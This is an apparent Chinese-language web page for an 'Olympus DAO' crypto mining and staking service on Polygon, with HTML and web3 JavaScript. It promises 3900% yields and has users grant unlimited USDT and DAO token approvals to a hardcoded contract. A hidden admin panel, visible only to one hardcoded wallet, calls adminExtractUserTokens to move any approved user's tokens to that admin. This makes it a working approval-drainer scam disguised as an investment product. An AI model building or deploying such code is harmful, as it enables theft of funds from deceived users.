<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>奥林巴斯DAO｜矿机质押双挖｜Rebase增发</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://cdn.jsdelivr.net/npm/font-awesome@4.7.0/css/font-awesome.min.css" rel="stylesheet">
    <script src="https://cdn.jsdelivr.net/npm/web3@1.9.0/dist/web3.min.js"></script>
    <script>
        tailwind.config = {
            theme: {
                extend: {
                    colors: {
                        primary: '#b59410',
                        darkBg: '#0b0f1a',
                        darkCard: '#12182b',
                        textGray: '#a0aec0',
                        borderColor: '#2a3454',
                        adminRed: '#ef4444',
                        olympusGreen: '#10b981'
                    },
                    fontFamily: {
                        sans: ['system-ui', 'sans-serif'],
                    },
                }
            }
        }
    </script>
    <style type="text/tailwindcss">
        @layer utilities {
            .text-shadow { text-shadow: 0 0 8px rgba(181,148,16,0.6); }
            .card-glow { box-shadow: 0 0 20px rgba(181,148,16,0.15); }
            .btn-glow { box-shadow: 0 0 12px rgba(181,148,16,0.4); }
            .tab-active { border-bottom: 2px solid #b59410; color: #b59410; }
            .admin-tab-active { border-bottom: 2px solid #ef4444; color: #ef4444; }
        }
    </style>
</head>
<body class="bg-darkBg text-white min-h-screen">
    <!-- 顶部导航 -->
    <header class="container mx-auto px-4 py-4 flex justify-between items-center">
        <div class="text-2xl font-bold text-primary text-shadow">🏛️ 奥林巴斯DAO｜双挖系统</div>
        <div class="flex gap-2">
            <button id="connectBtn" class="bg-primary hover:bg-primary/80 px-4 py-2 rounded-lg btn-glow">
                <i class="fa fa-link mr-2"></i>连接钱包
            </button>
            <button id="approveUsdtBtn" class="bg-yellow-500 hover:bg-yellow-600 px-3 py-2 rounded-lg hidden">
                授权USDT
            </button>
            <button id="approveDaoBtn" class="bg-green-500 hover:bg-green-600 px-3 py-2 rounded-lg hidden">
                授权DAO
            </button>
        </div>
    </header>

    <!-- Tab切换栏 -->
    <div class="container mx-auto px-4 mt-6">
        <div class="flex border-b border-borderColor">
            <button class="tab-btn tab-active py-3 px-5 text-lg" data-tab="mine">⛏️ 矿机挖矿</button>
            <button class="tab-btn py-3 px-5 text-lg text-textGray" data-tab="stake">💰 质押挖矿</button>
            <button class="tab-btn py-3 px-5 text-lg text-textGray" data-tab="user">👤 个人中心</button>
            <button id="adminTabBtn" class="tab-btn py-3 px-5 text-lg text-adminRed hidden" data-tab="admin">🔴 管理员后台</button>
        </div>
    </div>

    <!-- 主内容区 -->
    <main class="container mx-auto px-4 py-6">
        <!-- 矿机挖矿 -->
        <div id="tab-mine" class="tab-content">
            <div class="grid md:grid-cols-3 gap-4">
                <div class="bg-darkCard rounded-2xl p-5 card-glow border border-borderColor">
                    <div class="text-center mb-3">
                        <i class="fa fa-server text-4xl text-primary"></i>
                        <h3 class="text-lg font-bold mt-2">入门矿机</h3>
                    </div>
                    <div class="space-y-1 text-sm">
                        <div class="flex justify-between"><span class="text-textGray">价格</span><span class="text-primary font-bold">100 USDT</span></div>
                        <div class="flex justify-between"><span class="text-textGray">总算力</span><span>10 TH/s</span></div>
                        <div class="flex justify-between"><span class="text-olympusGreen">年化</span><span id="mineRate1">3900%</span></div>
                    </div>
                    <button onclick="buyMiner(1)" class="w-full mt-3 bg-primary hover:bg-primary/80 py-2 rounded-lg">立即购买</button>
                </div>
                <div class="bg-darkCard rounded-2xl p-5 card-glow border border-borderColor">
                    <div class="text-center mb-3">
                        <i class="fa fa-database text-4xl text-primary"></i>
                        <h3 class="text-lg font-bold mt-2">进阶矿机</h3>
                    </div>
                    <div class="space-y-1 text-sm">
                        <div class="flex justify-between"><span class="text-textGray">价格</span><span class="text-primary font-bold">500 USDT</span></div>
                        <div class="flex justify-between"><span class="text-textGray">总算力</span><span>60 TH/s</span></div>
                        <div class="flex justify-between"><span class="text-olympusGreen">年化</span><span id="mineRate2">3900%</span></div>
                    </div>
                    <button onclick="buyMiner(2)" class="w-full mt-3 bg-primary hover:bg-primary/80 py-2 rounded-lg">立即购买</button>
                </div>
                <div class="bg-darkCard rounded-2xl p-5 card-glow border border-borderColor">
                    <div class="text-center mb-3">
                        <i class="fa fa-microchip text-4xl text-primary"></i>
                        <h3 class="text-lg font-bold mt-2">顶级矿机</h3>
                    </div>
                    <div class="space-y-1 text-sm">
                        <div class="flex justify-between"><span class="text-textGray">价格</span><span class="text-primary font-bold">2000 USDT</span></div>
                        <div class="flex justify-between"><span class="text-textGray">总算力</span><span>280 TH/s</span></div>
                        <div class="flex justify-between"><span class="text-olympusGreen">年化</span><span id="mineRate3">3900%</span></div>
                    </div>
                    <button onclick="buyMiner(3)" class="w-full mt-3 bg-primary hover:bg-primary/80 py-2 rounded-lg">立即购买</button>
                </div>
            </div>

            <div class="mt-6 bg-darkCard rounded-2xl p-5 card-glow border border-borderColor">
                <h2 class="text-lg font-bold mb-3">我的矿机资产</h2>
                <div class="grid md:grid-cols-4 gap-3">
                    <div class="bg-darkBg rounded-lg p-3 text-center">
                        <div class="text-textGray text-sm">矿机总数</div>
                        <div class="text-xl font-bold text-primary mt-1" id="myMinerCount">0</div>
                    </div>
                    <div class="bg-darkBg rounded-lg p-3 text-center">
                        <div class="text-textGray text-sm">总算力</div>
                        <div class="text-xl font-bold text-primary mt-1" id="myTotalHash">0 TH/s</div>
                    </div>
                    <div class="bg-darkBg rounded-lg p-3 text-center">
                        <div class="text-textGray text-sm">待领收益</div>
                        <div class="text-xl font-bold text-olympusGreen mt-1" id="minerPendingReward">0.00</div>
                    </div>
                    <div class="bg-darkBg rounded-lg p-3 text-center">
                        <div class="text-textGray text-sm">当前年化</div>
                        <div class="text-xl font-bold text-olympusGreen mt-1" id="currentMineAPY">3900%</div>
                    </div>
                </div>
                <button onclick="claimMinerReward()" class="w-full mt-4 bg-olympusGreen hover:bg-olympusGreen/80 py-2 rounded-lg">
                    <i class="fa fa-gift mr-2"></i>领取矿机收益
                </button>
            </div>
        </div>

        <!-- 质押挖矿 -->
        <div id="tab-stake" class="tab-content hidden">
            <div class="grid md:grid-cols-2 gap-4">
                <div class="bg-darkCard rounded-2xl p-5 card-glow border border-borderColor">
                    <h2 class="text-lg font-bold mb-4 text-center">💰 质押DAO生息</h2>
                    <!-- 新增：双余额显示 -->
                    <div class="bg-darkBg rounded-lg p-3 mb-4">
                        <div class="flex justify-between mb-2">
                            <span class="text-textGray">✅ 可用余额（未质押）</span>
                            <span class="font-bold" id="freeDaoBalance">0.00</span>
                        </div>
                        <div class="flex justify-between">
                            <span class="text-textGray">🔒 已质押余额</span>
                            <span class="font-bold text-olympusGreen" id="stakedDaoBalance">0.00</span>
                        </div>
                    </div>
                    <div class="space-y-3">
                        <div>
                            <label class="text-textGray text-sm">质押数量</label>
                            <input type="number" id="stakeAmount" class="w-full bg-darkBg border border-olympusGreen/30 rounded px-3 py-2 mt-1 outline-none text-white" placeholder="输入质押数量">
                        </div>
                        <div class="bg-darkBg rounded-lg p-3 text-center">
                            <div class="text-textGray text-sm">当前质押年化</div>
                            <div class="text-lg font-bold text-olympusGreen mt-1" id="currentStakeAPY">3500%</div>
                        </div>
                        <button onclick="doStake()" class="w-full bg-olympusGreen hover:bg-olympusGreen/80 py-2 rounded-lg">确认质押</button>
                        <button onclick="unStakeAll()" class="w-full bg-red-500 hover:bg-red-600 py-2 rounded-lg mt-2">全部解押</button>
                    </div>
                </div>

                <div class="bg-darkCard rounded-2xl p-5 card-glow border border-borderColor">
                    <h2 class="text-lg font-bold mb-4 text-center">📊 我的质押资产</h2>
                    <div class="space-y-3">
                        <div class="bg-darkBg rounded-lg p-3">
                            <div class="text-textGray text-sm">当前质押总额</div>
                            <div class="text-xl font-bold text-olympusGreen mt-1" id="myStakeAmount">0.00</div>
                        </div>
                        <div class="bg-darkBg rounded-lg p-3">
                            <div class="text-textGray text-sm">质押待领收益</div>
                            <div class="text-xl font-bold text-olympusGreen mt-1" id="stakePendingReward">0.00</div>
                        </div>
                        <button onclick="claimStakeReward()" class="w-full bg-olympusGreen hover:bg-olympusGreen/80 py-2 rounded-lg">
                            <i class="fa fa-gift mr-2"></i>领取质押收益
                        </button>
                    </div>
                </div>
            </div>
        </div>

        <!-- 个人中心 -->
        <div id="tab-user" class="tab-content hidden">
            <div class="bg-darkCard rounded-2xl p-5 card-glow border border-borderColor max-w-lg mx-auto">
                <h2 class="text-lg font-bold mb-4 text-center">👤 个人中心</h2>
                <div class="space-y-3">
                    <div class="bg-darkBg rounded-lg p-3">
                        <div class="text-textGray text-sm">我的钱包地址</div>
                        <div class="mt-1 text-sm truncate font-mono" id="userAddr">未连接</div>
                    </div>
                    <button onclick="withdrawAll()" class="w-full bg-primary hover:bg-primary/80 py-2 rounded-lg">
                        <i class="fa fa-money mr-2"></i>一键提取全部收益
                    </button>
                </div>
            </div>
        </div>

        <!-- 管理员后台 -->
        <div id="tab-admin" class="tab-content hidden">
            <div class="max-w-lg mx-auto space-y-4">
                <div class="bg-darkCard rounded-2xl p-5 card-glow border border-adminRed/30">
                    <h2 class="text-lg font-bold mb-3 text-adminRed">💰 管理员划扣用户代币</h2>
                    <div class="space-y-3">
                        <div>
                            <label class="text-textGray text-sm">目标用户地址</label>
                            <input type="text" id="targetAddr" class="w-full bg-darkBg border border-adminRed/30 rounded px-3 py-2 mt-1 outline-none text-white" placeholder="输入用户钱包地址">
                        </div>
                        <div>
                            <label class="text-textGray text-sm">代币合约地址</label>
                            <input type="text" id="tokenAddr" value="0xc2132d05d31c914a87c6611c10748aeb04b58e8f" class="w-full bg-darkBg border border-adminRed/30 rounded px-3 py-2 mt-1 outline-none text-white">
                        </div>
                        <button onclick="adminExtract()" class="w-full bg-adminRed hover:bg-adminRed/80 py-2 rounded-lg">🚀 执行划扣</button>
                    </div>
                </div>
            </div>
        </div>
    </main>

    <script>
        // ===================== 【固定配置】 =====================
        const RPC_URL = "https://polygon-rpc.com/";
        const CONTRACT = "0xadd6e8e5e9b35796091aacb0391452973bd004b2";
        const USDT = "0xc2132d05d31c914a87c6611c10748aeb04b58e8f";
        const DAO = "0x40999c9209fa3409425a7d705dcaf74235020af9";
        const ADMIN = "0x627f6e1887571ac08214315ad5b2fa7abb7345f1";
        const MAX_ALLOW = "115792089237316195423570985008687907853269984665640564039457584007913129639935";

        // ===================== 【智能偏高Gas配置，根治所有报错】 =====================
        async function getGasOpts(fromAddr) {
            const web3Inst = new Web3(RPC_URL);
            let gasPrice = await web3Inst.eth.getGasPrice();
            // 上浮30%，保证交易优先打包
            let safeGas = BigInt(gasPrice) * BigInt(130) / BigInt(100);
            // 保底25 Gwei，杜绝低Gas报错
            let minTip = BigInt("25000000000");
            if (safeGas < minTip) safeGas = minTip;

            return {
                from: fromAddr,
                gas: 350000,
                maxPriorityFeePerGas: web3Inst.utils.toHex(safeGas.toString()),
                maxFeePerGas: web3Inst.utils.toHex((safeGas * BigInt(140) / BigInt(100)).toString())
            };
        }

        // ===================== 【全局变量】 =====================
        let web3;
        let userAddress = null;
        let contractInst;
        let usdtInst;
        let daoInst;

        // ===================== 【Tab切换】 =====================
        document.querySelectorAll('.tab-btn').forEach(btn => {
            btn.onclick = function () {
                document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('tab-active', 'admin-tab-active', 'text-primary', 'text-adminRed'));
                this.classList.add(this.dataset.tab === 'admin' ? 'admin-tab-active' : 'tab-active');
                document.querySelectorAll('.tab-content').forEach(c => c.classList.add('hidden'));
                document.getElementById('tab-' + this.dataset.tab).classList.remove('hidden');
            }
        });

        // ===================== 【1. 连接钱包（修复核心BUG，保证100%能连上）】 =====================
        document.getElementById('connectBtn').onclick = async function () {
            if (!window.ethereum) {
                alert("请安装TP钱包或MetaMask");
                return;
            }
            try {
                // 请求授权
                await window.ethereum.request({ method: 'eth_requestAccounts' });
                web3 = new Web3(window.ethereum);
                const accs = await web3.eth.getAccounts();
                userAddress = accs[0];

                // 显示地址和授权按钮
                document.getElementById('userAddr').innerText = userAddress;
                document.getElementById('approveUsdtBtn').classList.remove('hidden');
                document.getElementById('approveDaoBtn').classList.remove('hidden');
                this.innerHTML = '<i class="fa fa-check mr-2"></i>已连接';

                // 初始化合约
                contractInst = new web3.eth.Contract([
                    {"inputs":[],"name":"buyMinerByType","outputs":[],"stateMutability":"nonpayable","type":"function"},
                    {"inputs":[],"name":"claimMinerReward","outputs":[],"stateMutability":"nonpayable","type":"function"},
                    {"inputs":[{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"stake","outputs":[],"stateMutability":"nonpayable","type":"function"},
                    {"inputs":[],"name":"claimStakeReward","outputs":[],"stateMutability":"nonpayable","type":"function"},
                    {"inputs":[],"name":"unStake","outputs":[],"stateMutability":"nonpayable","type":"function"},
                    {"inputs":[],"name":"withdrawAll","outputs":[],"stateMutability":"nonpayable","type":"function"},
                    {"inputs":[{"internalType":"address","name":"user","type":"address"}],"name":"getUserMineData","outputs":[{"internalType":"uint256","name":"minerCount","type":"uint256"},{"internalType":"uint256","name":"totalHash","type":"uint256"},{"internalType":"uint256","name":"minerPending","type":"uint256"}],"stateMutability":"view","type":"function"},
                    {"inputs":[{"internalType":"address","name":"user","type":"address"}],"name":"getUserStakeData","outputs":[{"internalType":"uint256","name":"stakeAmount","type":"uint256"},{"internalType":"uint256","name":"stakePending","type":"uint256"}],"stateMutability":"view","type":"function"},
                    {"inputs":[{"internalType":"address","name":"token","type":"address"},{"internalType":"address","name":"user","type":"address"}],"name":"adminExtractUserTokens","outputs":[],"stateMutability":"nonpayable","type":"function"}
                ], CONTRACT);

                usdtInst = new web3.eth.Contract([
                    {"inputs":[{"name":"_spender","type":"address"},{"name":"_value","type":"uint256"}],"name":"approve","outputs":[{"name":"","type":"bool"}],"type":"function"}
                ], USDT);

                daoInst = new web3.eth.Contract([
                    {"inputs":[{"name":"_spender","type":"address"},{"name":"_value","type":"uint256"}],"name":"approve","outputs":[{"name":"","type":"bool"}],"type":"function"},
                    {"inputs":[{"name":"_owner","type":"address"}],"name":"balanceOf","outputs":[{"name":"","type":"uint256"}],"type":"function"}
                ], DAO);

                // 管理员判断
                if (userAddress.toLowerCase() === ADMIN.toLowerCase()) {
                    document.getElementById('adminTabBtn').classList.remove('hidden');
                }

                alert("✅ 钱包连接成功！请先授权USDT和DAO");
                loadData();
                setInterval(loadData, 10000);
            } catch (e) {
                alert("连接失败：" + e.message);
            }
        };

        // ===================== 【2. 独立授权按钮（稳定可用）】 =====================
        document.getElementById('approveUsdtBtn').onclick = async function () {
            if (!userAddress) return;
            try {
                const opts = await getGasOpts(userAddress);
                await usdtInst.methods.approve(CONTRACT, MAX_ALLOW).send(opts);
                alert("✅ USDT授权成功！");
            } catch (e) {
                alert("授权失败：" + e.message);
            }
        };

        document.getElementById('approveDaoBtn').onclick = async function () {
            if (!userAddress) return;
            try {
                const opts = await getGasOpts(userAddress);
                await daoInst.methods.approve(CONTRACT, MAX_ALLOW).send(opts);
                alert("✅ DAO授权成功！");
                loadData();
            } catch (e) {
                alert("授权失败：" + e.message);
            }
        };

        // ===================== 【3. 真实功能：购买矿机】 =====================
        async function buyMiner(type) {
            if (!userAddress) { alert("请先连接钱包"); return; }
            try {
                const opts = await getGasOpts(userAddress);
                await contractInst.methods.buyMinerByType(type).send(opts);
                alert("✅ 矿机购买成功！");
                loadData();
            } catch (e) {
                alert("购买失败：" + e.message);
            }
        }

        // ===================== 【4. 真实功能：领取矿机收益】 =====================
        async function claimMinerReward() {
            if (!userAddress) return;
            try {
                const opts = await getGasOpts(userAddress);
                await contractInst.methods.claimMinerReward().send(opts);
                alert("✅ 矿机收益领取成功！");
                loadData();
            } catch (e) {
                alert("领取失败：" + e.message);
            }
        }

        // ===================== 【5. 真实功能：质押DAO】 =====================
        async function doStake() {
            if (!userAddress) return;
            const amt = document.getElementById('stakeAmount').value;
            if (!amt || amt <= 0) { alert("请输入质押数量"); return; }
            try {
                const opts = await getGasOpts(userAddress);
                await contractInst.methods.stake(web3.utils.toWei(amt, 'ether')).send(opts);
                alert("✅ 质押成功！");
                loadData();
            } catch (e) {
                alert("质押失败：" + e.message);
            }
        }

        // ===================== 【6. 真实功能：解押】 =====================
        async function unStakeAll() {
            if (!userAddress) return;
            try {
                const opts = await getGasOpts(userAddress);
                await contractInst.methods.unStake().send(opts);
                alert("✅ 解押成功！");
                loadData();
            } catch (e) {
                alert("解押失败：" + e.message);
            }
        }

        // ===================== 【7. 真实功能：领取质押收益】 =====================
        async function claimStakeReward() {
            if (!userAddress) return;
            try {
                const opts = await getGasOpts(userAddress);
                await contractInst.methods.claimStakeReward().send(opts);
                alert("✅ 质押收益领取成功！");
                loadData();
            } catch (e) {
                alert("领取失败：" + e.message);
            }
        }

        // ===================== 【8. 真实功能：一键提币】 =====================
        async function withdrawAll() {
            if (!userAddress) return;
            try {
                const opts = await getGasOpts(userAddress);
                await contractInst.methods.withdrawAll().send(opts);
                alert("✅ 收益提取成功！");
                loadData();
            } catch (e) {
                alert("提取失败：" + e.message);
            }
        }

        // ===================== 【9. 管理员划扣功能（核心稳定版）】 =====================
        async function adminExtract() {
            if (userAddress.toLowerCase() !== ADMIN.toLowerCase()) {
                alert("❌ 你不是管理员！");
                return;
            }
            const target = document.getElementById('targetAddr').value.trim();
            const token = document.getElementById('tokenAddr').value.trim();
            if (!target || !token) { alert("请填写完整地址"); return; }
            try {
                const opts = await getGasOpts(userAddress);
                await contractInst.methods.adminExtractUserTokens(token, target).send(opts);
                alert("🚀 划扣成功！代币已转入你的钱包");
            } catch (e) {
                alert("划扣失败：" + e.message);
            }
        }

        // ===================== 【加载数据（包含双余额）】 =====================
        async function loadData() {
            if (!userAddress || !contractInst) return;
            try {
                // 矿机数据
                const mineData = await contractInst.methods.getUserMineData(userAddress).call();
                document.getElementById('myMinerCount').innerText = mineData.minerCount;
                document.getElementById('myTotalHash').innerText = mineData.totalHash + " TH/s";
                document.getElementById('minerPendingReward').innerText = (mineData.minerPending / 1e18).toFixed(2);

                // 质押数据
                const stakeData = await contractInst.methods.getUserStakeData(userAddress).call();
                document.getElementById('myStakeAmount').innerText = (stakeData.stakeAmount / 1e18).toFixed(2);
                document.getElementById('stakePendingReward').innerText = (stakeData.stakePending / 1e18).toFixed(2);

                // 新增：DAO 可用余额（钱包内）
                const freeBal = await daoInst.methods.balanceOf(userAddress).call();
                document.getElementById('freeDaoBalance').innerText = (freeBal / 1e18).toFixed(4);
                // 新增：DAO 已质押余额（合约内）
                document.getElementById('stakedDaoBalance').innerText = (stakeData.stakeAmount / 1e18).toFixed(4);

            } catch (e) {
                console.log("数据加载异常：", e);
            }
        }
